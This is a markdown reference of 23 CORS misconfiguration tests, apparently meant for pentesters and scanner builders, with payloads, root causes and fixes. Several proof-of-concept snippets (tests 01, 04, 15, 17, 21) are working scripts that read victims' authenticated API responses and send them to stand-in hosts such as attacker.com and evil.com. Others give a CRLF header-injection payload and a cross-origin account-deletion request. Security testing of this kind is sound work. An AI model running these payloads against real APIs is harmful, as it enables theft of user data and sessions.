# 🌐 CORS Misconfiguration — Full Test Matrix

> A complete reference of every CORS misconfiguration test scenario — with attack logic, root cause, and concrete PoC for each one. Built for pentesters, bug bounty hunters, and security engineers implementing automated scanners.

**23 test scenarios** · 11 classic · 12 new (2022–2025 research)  
Compiled from PortSwigger, HackTricks, Intigriti, PT SWARM, and public bug bounty writeups.

---

## Table of Contents

| # | Test | Type |
|---|------|------|
| [01](#01-pre-domain-bypass) | Pre-domain Bypass | Classic |
| [02](#02-post-domain-bypass) | Post-domain Bypass | Classic |
| [03](#03-backtick-bypass) | Backtick Bypass | Classic |
| [04](#04-null-origin-bypass) | Null Origin Bypass | Classic |
| [05](#05-unescaped-dot-bypass) | Unescaped Dot Bypass | Classic |
| [06](#06-underscore-bypass) | Underscore Bypass | Classic |
| [07](#07-invalid-value) | Invalid Value | Classic |
| [08](#08-wildcard-value) | Wildcard Value | Classic |
| [09](#09-origin-reflection) | Origin Reflection | Classic |
| [10](#10-third-party-allowance) | Third-party Allowance | Classic |
| [11](#11-http-allowance) | HTTP Allowance | Classic |
| [12](#12-safari-special-character-bypass) | Safari Special Character Bypass | New |
| [13](#13-crlf-injection-in-origin--cache-poisoning) | CRLF Injection + Cache Poisoning | New |
| [14](#14-missing-vary-origin-header) | Missing `Vary: Origin` Header | New |
| [15](#15-jsonp-callback-bypass) | JSONP Callback Bypass | New |
| [16](#16-subdomain-takeover-chain) | Subdomain Takeover Chain | New · Chain |
| [17](#17-xss-on-trusted-subdomain) | XSS on Trusted Subdomain | New · Chain |
| [18](#18-samesite-bypass-via-subdomain-reflection) | SameSite Bypass via Subdomain | New · Chain |
| [19](#19--userinfo-syntax-bypass) | `@` Userinfo Syntax Bypass | New |
| [20](#20-0000--local-network-bypass) | 0.0.0.0 / Local Network Bypass | New |
| [21](#21-trusted-cdn--s3-upload-abuse) | Trusted CDN / S3 Upload Abuse | New · Chain |
| [22](#22-preflight-method-abuse) | Preflight Method Abuse | New |
| [23](#23-protocol-downgrade-http-on-https-target) | Protocol Downgrade | New |

---

## Quick Mental Map

Before diving in, here's how the 23 tests group conceptually — useful when building an automated scanner:

- **Regex/parsing exploits** `T01–T06, T19` — abuse how the server pattern-matches the Origin string. Root cause is always the same: the check is not strict enough.
- **Trust model exploits** `T04, T07–T11, T20, T23` — don't break the regex, they find something the allowlist *legitimately trusts* that it shouldn't: null, wildcards, HTTP versions, internal IPs.
- **Cache/injection exploits** `T13, T14` — poison the response pipeline rather than stealing cookies directly. T14 is a passive check — no payload needed.
- **SOP bypass** `T15` — JSONP makes CORS headers irrelevant entirely.
- **Chain attacks** `T16, T17, T18, T21` — require a second vulnerability. Flag them as "critical if [takeover/XSS/misconfigured bucket] exists."

---

## Classic Tests

---

### 01. Pre-domain Bypass

**Payload:** `Origin: https://evil-target.com`

**Logic:**  
The server validates the Origin using `endsWith()` or a regex like `/target\.com$/` — it only checks if the string *ends with* or *contains* `target.com` without anchoring to the domain boundary. An attacker registers a domain that ends with the target string and passes the check.

**Root Cause:**  
Missing word-boundary anchoring. `origin.includes("target.com")` matches `evil-target.com`.

**PoC:**
```javascript
// Hosted on: https://evil-target.com/steal.html
var req = new XMLHttpRequest();
req.onload = function() {
  fetch("https://attacker.com/log?d=" + btoa(req.responseText));
};
req.open("GET", "https://api.target.com/account", true);
req.withCredentials = true; // sends victim cookies
req.send();
```

Browser sends `Origin: https://evil-target.com` → weak check passes → `ACAO: https://evil-target.com` + `ACAC: true` → credentials leak.

> 🔴 **Impact:** Full credential theft

---

### 02. Post-domain Bypass

**Payload:** `Origin: https://target.com.attacker.com`

**Logic:**  
The server uses `startsWith()` or a regex that checks if the origin *starts with* the trusted domain. An attacker registers `target.com.attacker.com` — it starts with `target.com` so it passes. The dot after `com` is not anchored.

**Root Cause:**  
No end anchor (`$`) in the regex or naive `startsWith("https://target.com")`.

**PoC:**
```javascript
// Server-side vulnerable check:
if (origin.startsWith("https://target.com")) // ← WRONG
  res.setHeader("Access-Control-Allow-Origin", origin);

// Why it's wrong:
"https://target.com.attacker.com".startsWith("https://target.com")
// → true ✓ (attacker passes)

// Correct check:
if (origin === "https://target.com" || origin.endsWith(".target.com"))
```

> 🔴 **Impact:** Full credential theft — requires domain registration

---

### 03. Backtick Bypass

**Payload:** `Origin: https://target.com`.attacker.com`

**Logic:**  
In some browsers (historically Chrome), a backtick (`` ` ``) was treated as a valid domain character. Some server-side URL parsers truncate at backtick and evaluate the origin as `https://target.com`, which passes the whitelist check. The attacker page on `attacker.com` receives the reflected origin and reads the response.

**Root Cause:**  
Browser/server parsing inconsistency. The server's parser stops at the backtick and validates only the prefix.

**PoC:**
```http
Origin: https://target.com`.attacker.com

# Server parser sees:  https://target.com  (truncates at backtick)
# Response:            ACAO: https://target.com`.attacker.com
# Attacker's domain receives the trusted response
```

> 🔴 **Impact:** Browser/version-dependent — test manually

---

### 04. Null Origin Bypass

**Payload:** `Origin: null`

**Logic:**  
Browsers send `Origin: null` in specific situations: requests from `file://` URIs, sandboxed iframes, `data:` URIs, or cross-origin redirects. Some developers whitelist `null` for local development and forget to remove it. Any attacker page can force a browser to send `null` as the Origin using a sandboxed iframe with a `data:` URI.

**Root Cause:**  
Server has `if (origin === "null") allow` in the whitelist — intended for localhost dev, left in production.

**PoC:**
```html
<!-- Sandboxed iframe forces Origin: null -->
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      top.location = 'https://attacker.com/log?d=' + btoa(this.responseText);
    };
    req.open('GET', 'https://api.target.com/profile', true);
    req.withCredentials = true;
    req.send();
  </script>">
</iframe>
```

The browser sends `Origin: null` → server trusts it → returns authenticated response with `ACAC: true`.

> 🔴 **Impact:** Exploitable from any origin — critical

---

### 05. Unescaped Dot Bypass

**Payload:** `Origin: https://targetXcom.attacker.com`

**Logic:**  
In regex, a dot (`.`) is a wildcard that matches *any character*. If the developer validates with `/target.com/` without escaping to `\.`, then `targetXcom.attacker.com` (where X is any character) also matches. The attacker registers a domain replacing the literal dot with any character.

**Root Cause:**  
Unescaped dot in regex: `/target.com/` instead of `/target\.com/`.

**PoC:**
```javascript
// Vulnerable regex:
/target.com/.test("https://targetXcom.attacker.com")
// → true ✓ (dot matches 'X')

// Correct regex:
/^https:\/\/target\.com$/.test("https://targetXcom.attacker.com")
// → false ✗ (escaped dot only matches literal dot)
```

> 🔴 **Impact:** Exploitable — requires domain registration

---

### 06. Underscore Bypass

**Payload:** `Origin: https://target.application_.arbitrary.com`

**Logic:**  
Chrome and Firefox accept underscores (`_`) in subdomain names (technically RFC-invalid, but browsers allow it). Regex validators using `[a-zA-Z0-9-.]` exclude underscore — but the browser parses and sends it fine. When the regex allows `\w` (which includes `_`), the attacker crafts a domain that looks like a subdomain of the target but is actually under attacker control.

**Root Cause:**  
Divergence between RFC 952 (no underscores in hostnames) and actual browser behavior.

**PoC:**
```http
GET /api/data HTTP/2
Host: api.target.com
Cookie: session=victim_session
Origin: https://target.application_.arbitrary.com

--- Vulnerable response ---
Access-Control-Allow-Origin: https://target.application_.arbitrary.com
Access-Control-Allow-Credentials: true
```

> 🔴 **Impact:** Chrome + Firefox exploitable

---

### 07. Invalid Value

**Payload:** `Origin: invalid` / `Origin: ` (empty)

**Logic:**  
Tests how the server handles unexpected or unparseable Origin values. The goal is to find if validation error paths fall back to permissive behavior — such as reflecting the invalid value or falling back to `*`. Reveals logic flaws in the error handling branch of CORS validation.

**Root Cause:**  
Catch blocks in origin validation that set permissive headers, or missing format validation before reflection.

**PoC:**
```http
# Payloads to try:
Origin: invalid
Origin:                  (empty)
Origin: http://          (incomplete)
Origin: .                (just a dot)

# Check for these vulnerable responses:
Access-Control-Allow-Origin: invalid      ← reflected invalid value
Access-Control-Allow-Origin: *            ← fallback to wildcard
Access-Control-Allow-Origin: null         ← fallback to null
```

> 🔵 **Impact:** Informational — reveals parsing behavior

---

### 08. Wildcard Value

**Payload:** (passive — check `ACAO: *` in responses)

**Logic:**  
A wildcard allows any origin to read the response. Dangerous when the endpoint exposes sensitive data that doesn't rely on cookies: API keys in response bodies, tokens in query params, PII in JSON. Also test for the `ACAO: *` + `ACAC: true` combination — browsers reject it, but some non-browser clients (mobile apps, scripts) don't.

**Root Cause:**  
Default permissive config. Developer sets `*` for convenience without auditing what data the endpoint returns.

**PoC:**
```javascript
// Any attacker page can do this with no credentials needed:
fetch("https://api.target.com/internal/config")
  .then(r => r.json())
  .then(data => {
    // If response contains API keys, tokens, PII → critical even without cookies
    exfil(data.api_key, data.internal_endpoints);
  });
```

> 🟡 **Impact:** Context-dependent — check what the response contains

---

### 09. Origin Reflection

**Payload:** `Origin: https://completely-random-domain.io`

**Logic:**  
The server copies whatever is in the `Origin` header directly into `Access-Control-Allow-Origin` without any validation. Most severe misconfiguration: unconditional trust of all origins. Common in Node.js/Express apps that misuse CORS middleware.

**Root Cause:**  
`res.setHeader("Access-Control-Allow-Origin", req.headers.origin)` with zero validation.

**PoC:**
```http
GET /api/user/profile HTTP/1.1
Origin: https://completely-random-domain.io
Cookie: session=abc123

--- Vulnerable response ---
Access-Control-Allow-Origin: https://completely-random-domain.io
Access-Control-Allow-Credentials: true
```

If any random origin is reflected with `ACAC: true` — the application is fully compromised.

> 🔴 **Impact:** Critical — worst case, every authenticated endpoint is exposed

---

### 10. Third-Party Allowance

**Payload:** `Origin: https://trusted-third-party.com`

**Logic:**  
The server explicitly trusts third-party domains — CDNs, analytics services, SaaS partners. Risk: if that third-party allows user-controlled content (uploads to S3, user pages on a SaaS platform, or a subdomain subject to takeover), an attacker can host malicious JavaScript on a "trusted" origin and make credentialed CORS requests to the target API.

**Root Cause:**  
Application trusts external domains it doesn't fully control. The trust chain is only as strong as the third-party's security posture.

**PoC:**
```http
# Check what third-party origins are in the allowlist:
Access-Control-Allow-Origin: https://cdn.thirdparty.com

# Check if thirdparty.com allows user uploads or has XSS:
# If yes → host attack there → credentialed requests auto-trusted
```

> 🟣 **Impact:** Requires third-party compromise or upload capability

---

### 11. HTTP Allowance

**Payload:** `Origin: http://target.com` (HTTP instead of HTTPS)

**Logic:**  
The server trusts the HTTP version of a whitelisted HTTPS origin. An attacker with MITM position (public WiFi, corporate proxy) can intercept HTTP traffic, inject a page that makes credentialed requests to the HTTPS API. HSTS protections on the API are bypassed because the CORS policy itself permits the insecure origin.

**Root Cause:**  
Origin comparison ignores the scheme: `origin.includes("target.com")` matches both `http://` and `https://`.

**PoC:**
```http
GET /api/orders HTTP/1.1
Origin: http://target.com        ← HTTP not HTTPS
Cookie: session=victim_cookie

--- Vulnerable response ---
Access-Control-Allow-Origin: http://target.com
Access-Control-Allow-Credentials: true
```

> 🔴 **Impact:** Requires MITM position — escalates HTTP interception to credential theft

---

## New Tests (2022–2025)

---

### 12. Safari Special Character Bypass

**Payload:** `Origin: https://target.com}.attacker.com`

**Logic:**  
PortSwigger's URL validation bypass cheat sheet found that Safari accepts characters like `}`, `{`, `|`, `~`, `!`, and `"` within domain names, while Chrome and Firefox reject them. When some server-side URL parsers encounter these characters, they truncate the host at that point — making them evaluate `https://target.com` as the origin and passing the whitelist check, while reflecting the full crafted origin back to the attacker.

**Root Cause:**  
Safari's URL parser is more lenient than the RFC. Parser differential between what Safari sends and what validators expect.

**PoC:**
```http
GET /api/profile HTTP/2
Origin: https://target.com}.attacker.com

--- Vulnerable response ---
Access-Control-Allow-Origin: https://target.com}.attacker.com
Access-Control-Allow-Credentials: true

# Full character list to test:
https://target.com}.attacker.com
https://target.com{.attacker.com
https://target.com|.attacker.com
https://target.com~.attacker.com
https://target.com".attacker.com
```

> 🔴 **Impact:** Safari-specific — test all special chars

---

### 13. CRLF Injection in Origin / Cache Poisoning

**Payload:** `Origin: z%0d%0aContent-Type: text/html; charset=UTF-7`

**Logic:**  
If the server reflects the `Origin` header without stripping CR (`\r`, `%0d`) or LF (`\n`, `%0a`) characters, an attacker can inject arbitrary HTTP response headers. When the poisoned response is cached by a CDN or reverse proxy, the injected headers are stored and served to all subsequent users — turning a CORS misconfiguration into a server-side stored XSS without requiring the victim to visit the attacker's page.

**Root Cause:**  
Missing sanitization of control characters before reflecting the `Origin` into `Access-Control-Allow-Origin`.

**PoC (via Burp Suite — browsers won't send raw `\r`):**
```http
GET /api/data HTTP/1.1
Origin: z[CR]Content-Type: text/html; charset=UTF-7

--- If server reflects without sanitizing ---
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7   ← injected!
Cache-Control: public, max-age=3600

# If cached → all subsequent users receive UTF-7 content type
# UTF-7 can encode XSS payloads that evade UTF-8 filters

# Payload variants:
Origin: test%0d%0aX-Injected: header
Origin: test%0aX-Injected: header
Origin: test\r\nSet-Cookie: malicious=1
```

> 🔴 **Impact:** Can escalate to stored XSS via cache poisoning

---

### 14. Missing `Vary: Origin` Header

**Payload:** Passive check — no Origin manipulation required

**Logic:**  
When a server dynamically generates `Access-Control-Allow-Origin` based on the request's `Origin` header, it **must** include `Vary: Origin` in the response. Without it, CDNs and reverse proxies may cache a response authorized for `attacker.com` and serve that same response — with `ACAO: https://attacker.com` — to all subsequent visitors.

**Root Cause:**  
Developer added CORS headers dynamically but forgot to add `Vary: Origin`. The cache treats all requests to the same URL as equivalent regardless of Origin.

**PoC:**
```http
GET /api/public-data HTTP/1.1
Origin: https://attacker.com

--- Vulnerable cached response ---
Access-Control-Allow-Origin: https://attacker.com
# Missing: Vary: Origin   ← the problem
Cache-Control: public, s-maxage=300

--- What the next user gets (from cache) ---
Access-Control-Allow-Origin: https://attacker.com   ← poisoned
# Attacker's origin now has cross-origin access for 5 minutes
```

> ⚡ **Key Rule:** If `ACAO` is dynamic (reflected or allowlist-based), `Vary: Origin` is **mandatory**. Absent + cacheable response = confirmed finding.

> 🟡 **Impact:** Passive detection — always check this header on dynamic CORS responses

---

### 15. JSONP Callback Bypass

**Payload:** `GET /api/user?callback=attackerFunction`

**Logic:**  
JSONP wraps JSON in a JavaScript function call named by the `callback` parameter and returns it as `Content-Type: application/javascript`. The browser loads it via a `<script>` tag, completely bypassing SOP — because `<script src>` can load cross-origin resources without CORS restrictions. If an API still supports JSONP, all CORS protections become irrelevant.

**Root Cause:**  
Legacy JSONP support left in the codebase alongside modern REST/JSON endpoints.

**PoC:**
```html
<!-- Discovery: try GET /api/user?callback=test -->
<!-- If response is: test({"user": ...}) with Content-Type: application/javascript → JSONP live -->

<!-- Exploit on attacker.com: -->
<script>
  function steal(data) {
    // Called with victim's authenticated data as the argument
    fetch("https://attacker.com/log?d=" + JSON.stringify(data));
  }
</script>
<script src="https://api.target.com/user/profile?callback=steal"></script>
<!-- Browser loads: steal({"email":"victim@...", "token":"..."}) -->
<!-- CORS headers are completely irrelevant — script tags bypass SOP -->

<!-- Params to probe: -->
<!-- ?callback=test  ?jsonp=test  ?cb=test  ?json=test  ?fmt=jsonp -->
```

> 🔴 **Impact:** Complete SOP bypass — CORS headers irrelevant

---

### 16. Subdomain Takeover Chain

**Payload:** `Origin: https://dangling.target.com`

**Logic:**  
When CORS trusts all subdomains (`*.target.com`), the policy is only as strong as the security of every single subdomain. If any subdomain has a dangling DNS record pointing to a decommissioned service (expired Heroku app, deleted S3 bucket, unclaimed GitHub Pages), an attacker can claim that service and host arbitrary JavaScript there — from a fully trusted CORS origin.

**Root Cause:**  
DNS records outlive the services they point to. Wildcard CORS trust compounds the risk.

**PoC:**
```bash
# Step 1: Confirm wildcard subdomain trust
curl -s https://api.target.com/ -H "Origin: https://test.target.com" -I
# → ACAO: https://test.target.com → wildcard trust confirmed

# Step 2: Enumerate subdomains + check for dangling DNS
# Tools: subjack, nuclei, dnsx, https://github.com/EdOverflow/can-i-take-over-xyz

# Step 3: Claim the dangling subdomain (e.g., register the expired Heroku app)
# Step 4: Host attack JS on the taken-over subdomain — fully trusted by CORS
```

> 🟣 **Impact:** Critical — requires subdomain recon + takeover

---

### 17. XSS on Trusted Subdomain

**Payload:** XSS on `sub.target.com` → credentialed CORS requests to `api.target.com`

**Logic:**  
A CORS policy trusting `*.target.com` is vulnerable if *any* subdomain has an XSS vulnerability. XSS on `blog.target.com` gives execution context on that origin — which is fully trusted. The injected code can make credentialed requests to `api.target.com` and read back the responses, since the browser sees the request as coming from a whitelisted origin.

**Root Cause:**  
CORS trust is transitive through XSS. The CORS policy is "correct" but the attack surface it creates is larger than anticipated.

**PoC:**
```javascript
// XSS payload on blog.target.com:
var req = new XMLHttpRequest();
req.onload = function() {
  // We're on blog.target.com — api.target.com trusts this origin!
  new Image().src = "https://evil.com/?" + btoa(req.responseText);
};
req.open("GET", "https://api.target.com/user/data", true);
req.withCredentials = true;
req.send();
// CORS policy sees origin = blog.target.com → trusted → responds with credentials
```

> 🟣 **Impact:** Requires XSS on any trusted subdomain — map trust relationships during recon

---

### 18. SameSite Cookie Bypass via Subdomain Reflection

**Payload:** `Origin: https://any-subdomain.target.com`

**Logic:**  
`SameSite=Lax/Strict` restricts cookies to same-site requests. "Same-site" means same registrable domain — so `*.target.com` is same-site with `api.target.com`. If CORS reflects any subdomain of the target, and an attacker controls one of those subdomains (via XSS or takeover), their requests are considered same-site. `SameSite` cookies are sent, bypassing the cookie protection entirely.

**Root Cause:**  
`SameSite` is a cookie protection, not a CORS protection. Subdomain requests are same-site — `SameSite` restrictions don't apply.

**PoC:**
```javascript
// Cross-site request (from evil.com) → SameSite=Strict BLOCKS cookie
fetch("https://api.target.com/data", {credentials: "include"})
// → Cookie NOT sent

// Same-site request (from old.target.com) → SameSite=Strict ALLOWS cookie
// old.target.com is same-site as api.target.com (both under *.target.com)
fetch("https://api.target.com/data", {credentials: "include"})
// → Cookie SENT ✓ — SameSite bypassed
// → CORS allows old.target.com ✓
// → Full credential leak achieved even with SameSite=Strict
```

> 🔴 **Impact:** Bypasses SameSite cookie protections — high impact chain

---

### 19. @ / Userinfo Syntax Bypass

**Payload:** `Origin: https://foo@evil.com@target.com`

**Logic:**  
URLs support a userinfo component (`user:password@host`). Some URL parsers extract the host as the last `@`-separated component. A validator doing `getHost(origin) == "target.com"` may evaluate `target.com` as the host in `foo@evil.com@target.com`, while the actual page is on `evil.com`. Different parsers return different results for this input, creating a validation bypass.

**Root Cause:**  
Ambiguous URL parsing: `new URL("https://foo@evil.com@target.com").hostname` returns different values depending on the framework.

**PoC:**
```javascript
// Parser A (some Node.js versions):
new URL("https://foo@evil.com@target.com").hostname
// → "target.com"  (last @ wins — validator passes)

// Attacker's page is on evil.com but validator sees target.com
// Server reflects the full crafted origin → attacker reads response

// Payloads to test:
// Origin: https://foo@evil.com@target.com
// Origin: https://target.com@evil.com
// Origin: https://evil.com%40target.com      (URL-encoded @)

// Also test TLD confusion:
// Origin: https://target.com.au              (different TLD)
// Origin: https://target.computer            (.computer is a real TLD)
```

> 🔴 **Impact:** Parser-dependent — test across different backend frameworks

---

### 20. 0.0.0.0 / Local Network Bypass

**Payload:** `Origin: http://0.0.0.0`

**Logic:**  
Internal applications sometimes use network location as authentication — only allowing CORS from localhost or local IPs. The `0.0.0.0` IP is not classified as "local" by many implementations, and some internal CORS policies whitelist it for dev convenience. Any browser can send this as an Origin header since it's technically a valid origin.

**Root Cause:**  
Developers mistake "internal IP" for "safe to whitelist." `0.0.0.0` is treated inconsistently across implementations.

**PoC:**
```http
# Payloads for local bypass:
Origin: http://0.0.0.0
Origin: http://127.0.0.1
Origin: http://localhost
Origin: http://[::1]            ← IPv6 localhost
Origin: http://0                ← shorthand for 0.0.0.0 in some parsers

# Check response for:
Access-Control-Allow-Local-Network: true   ← local network CORS header
Access-Control-Allow-Origin: http://0.0.0.0
```

> 🔵 **Impact:** Relevant for internal/VPN-accessible APIs and IoT devices

---

### 21. Trusted CDN / S3 Upload Abuse

**Payload:** Upload JS to a bucket that's in the CORS allowlist

**Logic:**  
Many applications trust their CDN or object storage domain in the CORS policy. If that storage service allows public file uploads or has misconfigured bucket ACLs, an attacker can upload a JavaScript file to the trusted domain. Since the CORS policy explicitly trusts that CDN, any script hosted there can make credentialed cross-origin requests to the API.

**Root Cause:**  
Overly broad trust given to content-hosting domains. CDNs and object storage buckets serving user-uploaded content should never be in the CORS allowlist for authenticated APIs.

**PoC:**
```bash
# Step 1: Confirm CDN trust
curl -H "Origin: https://assets.target.com" https://api.target.com/profile -I
# → ACAO: https://assets.target.com ✓

# Step 2: Try uploading to the bucket
curl -X PUT https://assets.target.com/cors-attack.js \
  -H "Content-Type: application/javascript" \
  --data "fetch('https://api.target.com/user',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com/?d='+btoa(d)))"

# Step 3: Lure victim to load the uploaded script
```
```html
<script src="https://assets.target.com/cors-attack.js"></script>
```

> 🟣 **Impact:** Requires misconfigured CDN/bucket + CORS trust

---

### 22. Preflight Method Abuse

**Payload:** `OPTIONS` request with `Access-Control-Request-Method: DELETE`

**Logic:**  
Browsers send an `OPTIONS` preflight before "non-simple" requests (PUT, DELETE, PATCH). If the server responds with broad `Access-Control-Allow-Methods` combined with a loose origin policy, an attacker can send credentialed cross-origin `DELETE` or `PUT` requests. Even if the response body can't be read, the **action executes** — making this a CORS-assisted CSRF for methods that bypass traditional CSRF token checks.

**Root Cause:**  
Server requires preflight for state-changing methods but doesn't restrict the Origin in preflight responses. Both checks are required independently.

**PoC:**
```http
OPTIONS /api/user/account HTTP/1.1
Origin: https://attacker.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

--- Vulnerable preflight response ---
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Methods: DELETE, PUT, PATCH, POST
Access-Control-Allow-Credentials: true
```
```javascript
// Actual DELETE — browser now sends it with victim cookies
fetch("https://api.target.com/user/account", {
  method: "DELETE",
  credentials: "include"
});
// Account deleted — response body irrelevant, action already executed
```

> 🔴 **Impact:** CORS-assisted CSRF for state-changing methods

---

### 23. Protocol Downgrade (HTTP on HTTPS Target)

**Payload:** `Origin: http://trusted-domain.com` (HTTP version of a whitelisted HTTPS origin)

**Logic:**  
Different from test #11 (arbitrary HTTP) — this specifically tests the *exact HTTP version* of a *specifically whitelisted* HTTPS origin. If `https://partner.com` is explicitly whitelisted and the server also accepts `http://partner.com`, an attacker performing MITM on HTTP traffic to partner.com can inject a page that makes credentialed requests to the HTTPS API. HSTS on the API is irrelevant — the issue is that the CORS policy permits an insecure origin.

**Root Cause:**  
Origin comparison strips or ignores the scheme. `origin.includes("partner.com")` matches both `http://` and `https://`.

**PoC:**
```http
# Test this specific pair for EACH whitelisted HTTPS origin:
# Allowed: https://partner.com → also test:
Origin: http://partner.com        ← same domain, downgraded scheme

# Vulnerable check patterns:
origin.includes("partner.com")                  ← matches http: and https:
origin.split("//")[1] == "partner.com"           ← strips scheme before comparing

# Correct check:
origin === "https://partner.com"                 ← strict equality including scheme
```

> 🔴 **Impact:** Requires MITM — escalates HTTP interception to authenticated API access

---

## Detection Cheatsheet

```
Passive checks (no payload needed):
├── T08 — Look for ACAO: * on sensitive endpoints
├── T14 — Look for missing Vary: Origin on dynamic ACAO responses
└── T15 — Try ?callback= on every API endpoint

Active checks (single request):
├── T01 — Origin: https://evil-{target}.com
├── T02 — Origin: https://{target}.attacker.com
├── T03 — Origin: https://{target}`.attacker.com
├── T04 — Origin: null
├── T05 — Origin: https://{target}Xcom.attacker.com
├── T06 — Origin: https://{target}_.attacker.com
├── T07 — Origin: invalid / empty
├── T09 — Origin: https://random-domain.io
├── T11 — Origin: http://{target} (HTTP version)
├── T12 — Origin: https://{target}}.attacker.com (+ { | ~ " variants)
├── T13 — Origin: z%0d%0aX-Injected: header
├── T19 — Origin: https://foo@evil.com@{target}
├── T20 — Origin: http://0.0.0.0
├── T22 — OPTIONS with ACR-Method: DELETE
└── T23 — Origin: http://{whitelisted-domain} (HTTP of HTTPS allowlist entry)

Chain checks (require recon + additional vuln):
├── T10 — Third-party domain in allowlist → check if user-controlled content allowed
├── T16 — *.target.com trusted → enumerate subdomains for dangling DNS
├── T17 — *.target.com trusted → spider all subdomains for XSS
├── T18 — Subdomain reflection trusted → SameSite bypass via same-site subdomain
└── T21 — CDN domain trusted → check if bucket allows public uploads
```

---

## References

- [PortSwigger: Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [PortSwigger: URL validation bypass cheat sheet](https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet)
- [HackTricks: CORS Misconfigurations & Bypass](https://hacktricks.wiki/en/pentesting-web/cors-bypass.html)
- [Intigriti: Advanced CORS Exploitation Guide](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities)
- [Corben Leo: Advanced CORS Techniques](https://www.corben.io/advanced-cors-techniques/)
- [Medium: Think Outside The Scope — Advanced CORS Exploitation](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
- [MDN: Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

## License

This research reference is provided for educational purposes and authorized security testing only.  
Always obtain explicit written permission before testing any system you do not own.
